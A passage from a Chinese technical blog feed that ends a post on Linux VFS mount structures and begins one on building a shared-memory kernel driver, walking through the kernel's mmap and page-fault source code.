containing namespace */</span></span><br><span class="line"><span class="type">int</span> mnt_id;<span class="comment">/* mount identifier */</span></span><br><span class="line"><span class="type">int</span> mnt_group_id;<span class="comment">/* peer group identifier */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We put mnt_count &amp; mnt_expiry_mark at the end of struct vfsmount</span></span><br><span class="line"><span class="comment"> * to let these frequently modified fields in a separate cache line</span></span><br><span class="line"><span class="comment"> * (so that reads of mnt_flags wont ping-pong on SMP machines)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span> mnt_count;</span><br><span class="line"><span class="type">int</span> mnt_expiry_mark;<span class="comment">/* true if marked for expiry */</span></span><br><span class="line"><span class="type">int</span> mnt_pinned;</span><br><span class="line"><span class="type">int</span> mnt_ghosts;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line"><span class="type">int</span> *mnt_writers;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">int</span> mnt_writers;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>struct list_head mnt_hash;</code>：全局散列表。</li><li><code>struct vfsmount *mnt_parent;</code>：父文件系统的挂载点。</li><li><code>struct dentry *mnt_mountpoint;</code>： 父文件系统中该挂载点的 dentry。</li><li><code>struct dentry *mnt_root;</code>：当前文件系统中该挂载点的 dentry。</li><li><code>struct super_block *mnt_sb;</code>：指向文件系统的 super_block 。</li><li><code>struct list_head mnt_mounts;</code>：该挂载点下面的子挂载点列表。</li><li><code>struct list_head mnt_child;</code>：父文件系统的子挂载点的列表节点。</li><li><code>const char *mnt_devname;</code>：挂载的设备名。</li></ul><p>​最后，用这幅图来总结一下<code>struct file_system_type </code>，<code>struct vfsmount</code>以及<code>struct super_block</code>之间的关系。</p><p><img src="https://s2.loli.net/2023/01/18/xMGzm5QgSpiHUE3.png" alt="image.png"></p><p>​以及我们再来看一个实例，在下图中，根文件系统为<code>squashfs</code>，根目录为<code>“/”</code>，然后创建<code>/tmp</code>目录，并挂载为<code>ramfs</code>，之后又创建了<code>/tmp/usbdisk/volume9</code>和<code>/tmp/usbdisk/volume1</code>两个目录，并将<code>/tmp/dev/sda1</code>和<code>/tmp/dev/sdb1</code>两个分区挂载到这两个目录上。挂载完成后，VFS 中相关的数据结构的关系如图所示。</p><p><img src="https://s2.loli.net/2023/01/18/WyFNLAr8SXUBoG2.png" alt="image.png"></p><p>​Linux 支持相当多种类的文件系统，从本地文件系统（如 EXT2 等）到网络文件系统（如 NFS 等），Linux 标准内核已支持当年文件系统超过60种，多亏 VFS 层提供的统一框架，使得它们可以很轻松地与上层应用进行交互。</p><p>​到此，本章的故事总算也该讲完了，关于文件系统其实还有很重要的一块知识没谈到，那就是各种缓存机制，那么下一章我们可能再进一步分析一下文件系统相关的系统调用流程，也会谈到缓存，或自己动手操作一下相关的代码。最后，快过年了，也祝友友们新年快乐~</p>]]></content>
      
      
      
        <tags>
            
            <tag> Operating System </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核分析应用一 - 多进程共享内存内核驱动模块</title>
      <link href="/2023/01/13/03Linux_kernel_1/"/>
      <url>/2023/01/13/03Linux_kernel_1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>上一章节分析到 Linux 的虚拟地址空间布局，正好这段时间在学 Linux 内核，这部分内存管理是上一篇文章的有力实践，通过自己实现一个内核模块，可以进一步加深对 Linux 内存管理的认识，同时也对 Linux 内核开发有个学习！源代码在文末我放在 Gitee 上了，友友们遇到 bug 可以自行对照一下。</p></blockquote><h1 id="驱动功能演示"><a href="#驱动功能演示" class="headerlink" title="驱动功能演示"></a>驱动功能演示</h1><p>​目标：实现一个内核驱动模块，建立一个设备文件，在用户态用 mmap 将设备映射到各自的进程空间来实现进程间通信。首先编译并安装该内核模块，其中的<code>map_driver.c</code>便是该内核模块的源文件：</p><p><img src="https://s2.loli.net/2023/01/13/ZLTczpjRBvfghsq.png" alt="演示1.png"></p><p>​然后编译运行用户态程序，一个程序负责写入，另一个程序可以从该共享内存区读出相应的值，其中的<code>ASDDDFFGGHHJJKKL</code>即写进程的输入，读进程可以看到对应的值以及其虚拟地址空间（<code>Page1 initialize...</code>信息是我预设的初始字符串）。</p><p><img src="https://s2.loli.net/2023/01/13/KXgIW9BOz5l7pkn.png" alt="演示2.png"></p><p>​作为内核调试的重要一部分，还加入了日志信息可以查看内核加载卸载提示，对应进程的 pid ，读写信息，物理及逻辑地址等等，输入命令<code>dmesg</code>可以看到：</p><p><img src="https://s2.loli.net/2023/01/13/uptW5Vl9XTZOaCq.png" alt="演示3"></p><h1 id="内核开发原理"><a href="#内核开发原理" class="headerlink" title="内核开发原理"></a>内核开发原理</h1><p>​在了解整个代码流程之前，由个比较重要的前置知识 - Linux 内核模块开发，我在这里就不单独介绍了，友友们如果没了解过可以先去看看这部分的小基础。Linux 模块由没链接成完整的可执行文件的目标代码组成，可以动态链接到内核中，而内核空开发也与 c库开发存在区别，你只需要了解内核模块的编译，加载，查询，卸载，日志打印等流程，以及 Linux 内核模块代码结构即可。-&gt; <a href="https://zhuanlan.zhihu.com/p/420194002">如何编写一个Linux内核模块，这次手把手教你</a>。此外，这里有个[ Linux 内核 api 手册](<a href="https://deepinout.com/linux-kernel-api">Linux内核API|极客笔记 (deepinout.com)</a>)，感觉蛮不错的，需要的时候可以查查。</p><p>​该程序是实现一个内核驱动模块，通过共享设备文件来实现进程间通信。对于传统的读写文件方式，首先进程通过 open 函数打开设备文件，然后使用 read ,  write 以及 lseek 等调用进行 I&#x2F;O 操作， 这种方式是非常低效的，每一次 I&#x2F;O 操作都需要与外设交互，可能会频繁的触发系统调用导致 I&#x2F;O 效率的降低。所以我们在这里使用 mmap() 函数来解决这个问题，mmap 系统调用其实并不是完全为了用于共享内存而设计的，它本身提供了不同于一般对普通文件的访问方式，进程可以像读写内存一样对普通文件的操作。而 Posix 或 systemV 的共享内存 IPC 则纯粹用于共享内存目的，当然 mmap() 实现共享内存也是其主要应用之一。</p><p>​<code>mmap</code>函数的主要作用是可以将一个文件或者设备的内容映射到内存当中，用户就可以通过一些内存操作方式(如<code>memcpy</code>、<code>memset</code>)对文件或者设备进行直接操作，不必再调用 read ，write 等进行 I&#x2F;O 设备文件操作。mmap 并不分配物理空间, 只是将文件映射到调用进程的地址空间里（只会占用 virutal memory）, 一旦进行文件读写，操作系统就会陷入缺页中断进行物理页框的分配。文件写完后，内存中的内容并不会立即更新到文件中，而是待内存回收时写回设备文件中，当然也可以调用 msync 进行显式同步，这样所写的内容就能立即保存到文件里了，这和自己的驱动设计有关。 此外，通过 mmap 来写文件的方式无法增加文件的长度, 因为要映射的长度在调用 mmap 的时候就决定。如果想取消内存映射，可以调用 munmap 来进行取消。</p><p><img src="https://s2.loli.net/2023/01/13/7XbBUgv9NDpwCdJ.png" alt="image.png"></p><p>​mmap 本身是一个很复杂的系统调用过程，每个版本的设计也有所不同，我们先看一下基于 Linux 4.x 的实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> * <span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *start, <span class="type">size_t</span> length, <span class="type">int</span> prot , <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span></span><br></pre></td></tr></table></figure><ul><li>start：要映射到的内存区域的起始地址，通常都是用NULL，表示由内核来指定该内存地址。</li><li>length：要映射的内存区域的大小。</li><li>prot：期望的内存保护标志，不能与文件的打开模式冲突，可以通过 or 运算合理地组合在一起。<ul><li>PROT_EXEC  ：页内容可以被执行</li><li>PROT_READ  ： 页内容可以被读取</li><li>PROT_WRITE ： 页可以被写入</li><li>PROT_NONE  ：页不可访问</li></ul></li><li>flags：指定映射对象的类型，映射选项和映射页是否可以共享等标志位，下面给出几个比较重要的。<ul><li>MAP_FIXED ：使用指定的映射起始地址，如果由 start 和 len 参数指定的内存区重叠于现存的映射空间，重叠部分将会被丢弃。如果指定的起始地址不可用，操作将会失败。并且起始地址必须落在页的边界上。</li><li>MAP_SHARED ：对映射区域的写入数据会复制回文件内, 而且允许其他映射该文件的进程共享。</li><li>MAP_PRIVATE ：建立一个写入时拷贝的私有映射。内存区域的写入不会影响到原文件。</li><li>MAP_LOCKED ：锁定映射区的页面，从而防止页面被交换出内存。</li><li>MAP_ANONYMOUS ：匿名映射，映射区不与任何文件关联。</li></ul></li><li>fd：文件描述符（由open函数返回）。</li><li>offset：以文件开始处的偏移量，该值应该为大小为 PAGE_SIZE 的整数倍，通常为0表示从文件头开始映射。</li></ul><p>​mmap 系统调用的实现过程大致流程如下：</p><ol><li>先通过文件系统定位要映射的文件；  </li><li>权限检查, 映射的权限不会超过文件打开的方式, 也就是说如果文件是以只读方式打开, 那么则不允许建立一个可写映射；</li><li>创建一个vma对象, 并对之进行初始化；</li><li>调用映射文件的mmap函数, 其主要工作是给vm_ops向量表赋值；</li><li>把该vma链入该进程的vma链表中, 如果可以和前后的vma合并则合并；</li><li>如果是要求VM_LOCKED(映射区不被换出)方式映射, 则发出缺页请求, 把映射页面读入内存中。</li></ol><p>​总体来说 mmap 的调用过程复杂，短时间内还没法做到很深的掌握，下面我们按照其调用流程依次做一个简单的源码分析，为后面的内核开发做个小铺垫。下面是大体的 mmap 函数调用栈帧：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mmap</span>()</span><br><span class="line">└→<span class="built_in">sys_mmap</span>()</span><br><span class="line">    └→ <span class="built_in">sys_mmap_pgoff</span>()</span><br><span class="line">    └→ <span class="built_in">vm_mmap_pgoff</span>()</span><br><span class="line">            └→ <span class="built_in">do_mmap_pgoff</span>() ※</span><br><span class="line">               └→ <span class="built_in">mmap_region</span>()</span><br><span class="line">                  └→ file-&gt;f_op-&gt;<span class="built_in">mmap</span>(file, vma);</span><br></pre></td></tr></table></figure><p>​mmap 是通过系统调用进入内核，其对应的内核系统调用是<code>sys_mmap</code>函数，下面是 x86 下的系统调用表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#<span class="meta"># arch/x86/entry/syscalls/syscall_64.tbl64位系统下的mmap系统调用</span></span><br><span class="line"><span class="number">9</span>commonmmapsys_mmap</span><br><span class="line"><span class="number">10</span>commonmprotectsys_mprotect</span><br><span class="line"><span class="number">11</span>commonmunmapsys_munmap</span><br></pre></td></tr></table></figure><p>​<code>sys_mmap</code>的源码如下所示，主要处理了 offset 的页对齐问题，并进入<code>sys_mmap_pgoff</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">sys_mmap</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">long</span> prot, <span class="type">unsigned</span> <span class="type">long</span> flags, <span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">unsigned</span> <span class="type">long</span> off)</span>;</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span> error;</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (off &amp; ~PAGE_MASK) <span class="comment">// 判断offset是否是页对齐，如果不是页对齐就返回错误</span></span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = sys_mmap_pgoff(addr, len, prot, flags, fd, off &gt;&gt; PAGE_SHIFT);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​<code>sys_mmap_pgoff</code>函数主要处理了文件映射和匿名映射的预处理，下一步进入<code>vm_mmap_pgoff</code>函数，<code>vm_mmap_pgoff</code>函数处理了安全性问题，然后就进入下一关键的函数<code>do_mmap_pgoff</code>（下面的代码里写了详细的注释步骤）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">do_mmap_pgoff</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">long</span> addr, </span></span><br><span class="line"><span class="params">              <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">unsigned</span> <span class="type">long</span> prot, </span></span><br><span class="line"><span class="params">              <span class="type">unsigned</span> <span class="type">long</span> flags, <span class="type">unsigned</span> <span class="type">long</span> pgoff)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 1. 获取一个未被使用的虚拟内存区，并返回其起始地址</span></span><br><span class="line">    addr = get_unmapped_area(file, addr, len, pgoff, flags);</span><br><span class="line">    <span class="keyword">if</span> (addr &amp; ~PAGE_MASK)</span><br><span class="line">        <span class="keyword">return</span> addr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 根据映射类型做一些 flag 值的设定和错误检查。</span></span><br><span class="line"><span class="keyword">if</span> (file) &#123; <span class="comment">// 如果file不为NULL，则表示是基于文件的映射，否则是匿名映射</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file); <span class="comment">// 根据file获取inode结构</span></span><br><span class="line"><span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123; <span class="comment">// 根据是私有映射还是共享映射进行不同的处理</span></span><br><span class="line"><span class="keyword">case</span> MAP_SHARED: <span class="comment">// 共享映射</span></span><br><span class="line"><span class="keyword">if</span> ((prot&amp;PROT_WRITE) &amp;&amp; !(file-&gt;f_mode&amp;FMODE_WRITE))</span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_APPEND(inode) &amp;&amp; (file-&gt;f_mode &amp; FMODE_WRITE)) <span class="comment">// 判断是否为APPEND-ONLY文件，mmap不允许写入这种类型文件</span></span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (locks_verify_locked(file))</span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新一系列的使用于vm_area_struct的flag</span></span><br><span class="line">vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))</span><br><span class="line">vm_flags &amp;= ~(VM_MAYWRITE | VM_SHARED);</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> MAP_PRIVATE: <span class="comment">// 私有映射，也是设置flag</span></span><br><span class="line"><span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_READ)) <span class="comment">// 如果文件本身不允许读，那么就直接返回</span></span><br><span class="line"><span class="keyword">return</span> -EACCES;</span><br><span class="line"><span class="keyword">if</span> (file-&gt;f_path.mnt-&gt;mnt_flags &amp; MNT_NOEXEC) &#123;</span><br><span class="line"><span class="keyword">if</span> (vm_flags &amp; VM_EXEC)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line">vm_flags &amp;= ~VM_MAYEXEC;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file-&gt;f_op-&gt;mmap)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"><span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 匿名映射，也是设置flag</span></span><br><span class="line"><span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line"><span class="keyword">case</span> MAP_SHARED:</span><br><span class="line"><span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">pgoff = <span class="number">0</span>; <span class="comment">// 共享匿名映射忽略pgoff</span></span><br><span class="line">vm_flags |= VM_SHARED | VM_MAYSHARE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> MAP_PRIVATE:</span><br><span class="line">pgoff = addr &gt;&gt; PAGE_SHIFT; <span class="comment">// 匿名私有映射使用分配出来的addr作为pgoff</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 3. 调用 mmap_region() 函数继续进行映射操作</span></span><br><span class="line">    addr = mmap_region(file, addr, len, vm_flags, pgoff);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​总结起来该函数主要就是申请一段虚拟内存地址区域，然后根据映射类型做一些 flag 值的设定和错误检查，最后调用 <code>mmap_region()</code> 函数来进行进程的用户空间映射操作。接下来我们继续看看下一层的 <code>mmap_region()</code> 函数的实现，其完成了最后的映射过程，即将用户需要映射的虚拟地址范围加入当前进程的<code>mm_struct</code>结构中。</p><blockquote><p>对了，在往下探究之前请确保你对 <code>mm_struct</code>结构体和<code>vm_area_struct</code>结构体还算了解。我在上一篇文章有对其的介绍，不了解的同学可以先看看上一篇文章。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">mmap_region</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">long</span> addr,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">int</span> vm_flags, <span class="type">unsigned</span> <span class="type">long</span> pgoff,</span></span><br><span class="line"><span class="params">            <span class="type">int</span> accountable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取当前进程的 mm_struct 结构。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>, *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="type">int</span> correct_wcount = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 申请一个虚拟内存区管理结构(vma)</span></span><br><span class="line">    <span class="comment">// 用find_vma_links函数寻找当前进程的虚拟地址空间所管理的内存块(vma)是否与目前预备分配的内存块的地址有相交的关系，如果有先将其unmap</span></span><br><span class="line"><span class="keyword">if</span> (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link, &amp;rb_parent)) &#123;</span><br><span class="line"><span class="keyword">if</span> (do_munmap(mm, addr, len))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> munmap_back;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前申请的虚拟地址空间是否可以当前进程的虚拟地址空间进行合并，</span></span><br><span class="line">    <span class="comment">// 如果可以合并，直接修改当前进程的vma的vm_start和vm_end的值。</span></span><br><span class="line">vma = vma_merge(mm, prev, addr, addr + len, vm_flags, <span class="literal">NULL</span>, file, pgoff, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (vma)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="comment">// 如果无法合并，根据用户申请的地址空间范围，分配一个新的vma结构。</span></span><br><span class="line">vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 初始化vma结构各个字段的信息</span></span><br><span class="line">    vma-&gt;vm_mm = mm;</span><br><span class="line">    vma-&gt;vm_start = addr;</span><br><span class="line">    vma-&gt;vm_end = addr + len;</span><br><span class="line">    vma-&gt;vm_flags = vm_flags;</span><br><span class="line">    vma-&gt;vm_page_prot = protection_map[vm_flags &amp; (VM_READ|VM_WRITE|VM_EXEC|VM_SHARED)];</span><br><span class="line">    vma-&gt;vm_pgoff = pgoff;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file) &#123;<span class="comment">// 文件映射</span></span><br><span class="line">        ...</span><br><span class="line">        vma-&gt;vm_file = file;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 3. 此处是内存映射的关键点，调用文件系统的mmap函数作处理，</span></span><br><span class="line"><span class="comment">         * 该函数可自定义，文件系统会根据设计设定各自的mmap函数。</span></span><br><span class="line"><span class="comment">         * 同时还设置vma结构的 fault() 回调函数去处理page fault的情况。</span></span><br><span class="line"><span class="comment">         *    vma对象的 fault() 回调函数的作用是：</span></span><br><span class="line"><span class="comment">         *        - 当访问的虚拟内存没有映射到物理内存时，</span></span><br><span class="line"><span class="comment">         *        - 将会调用 fault() 回调函数对虚拟内存地址映射到物理内存地址。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        error = file-&gt;f_op-&gt;mmap(file, vma);</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 匿名映射</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 把 vma 结构连接到进程虚拟内存区的链表和红黑树中。</span></span><br><span class="line">    vma_link(mm, vma, prev, rb_link, rb_parent);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们可以看到，该函数根据用户需要分配的地址空间的信息，或扩展当前的进程的虚拟地址空间范围，或创建一个新的 vma 结构加入到进程的 mm_struct 当中，这样当前进程就有可以直接访问的 mmap 分配的内存区域，自此完成了整个 mmap 的映射过程了。不过注意这里只是分配了 vma 结构到进程的虚拟地址空间当中，只有实际访问页面的时候才会触发 page-fault 缺页异常，并给这些刚刚分配的虚拟地址空间的 vma 结构分配物理页框并建立页表。</p><p>​因此，对于多进程的共享文件映射，每个进程在调用 mmap 时都是单独建立自己的 vma 区域。在后续访问中，通过 page-fault 缺页异常构建自己的物理页框映射时，需要花较长时间访问硬盘才能将该文件对应的页的数据读入到内存，相比而言，共享匿名映射就会更加快速。</p><p>​自此， mmap 的通用流程就该结束了，当执行到<code>error = file-&gt;f_op-&gt;mmap(file, vma);</code>这一句时，正如上面所分析，该<code>mmap(file, vma)</code> 函数由各个设备的模块自定义，而我们后面写的内核模块其中一个任务也就是完成这部分代码。</p><p>​接下来我们再来简单看看缺页过程吧，mmap 众所周知只分配虚拟地址，当进程在实际读写时亦触发缺页中断，进而分配物理页框并建立页表映射。缺页异常的调用过程实际上也是相当复杂，这里我们就不再过多介绍了，这有篇文章，可以参考一下 <a href="https://zhuanlan.zhihu.com/p/540850512">缺页中断</a>，大体调用栈如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">do_page_fault</span>()</span><br><span class="line">└→ <span class="built_in">handle_mm_fault</span>()</span><br><span class="line">   └→ <span class="built_in">handle_pte_fault</span>()</span><br><span class="line">      └→ <span class="built_in">do_linear_fault</span>()</span><br><span class="line">         └→ __do_fault() ※</span><br></pre></td></tr></table></figure><p>​我们直接来看一下最后一步，<code>__do_fault()</code>函数实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__do_fault(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span><br><span class="line">           <span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pmd_t</span> *pmd, <span class="type">pgoff_t</span> pgoff,</span><br><span class="line">           <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    vmf.virtual_address = address &amp; PAGE_MASK; </span><br><span class="line">    vmf.pgoff = pgoff;                       </span><br><span class="line">    vmf.flags = flags;                       </span><br><span class="line">    vmf.page = <span class="literal">NULL</span>;       </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 如果虚拟内存管理区提供了 falut() 回调函数，那么将调用此函数来获取要映射的物理内存页，</span></span><br><span class="line">    <span class="comment">//    我们在 mmap() 系统调用的实现中看到，已经将其设置为 map_fault() 函数了。</span></span><br><span class="line">    <span class="comment">//    不同版本的 Linux 源码的该函数定义不一样，</span></span><br><span class="line">    <span class="comment">//    我们实现的在头文件中定义这样 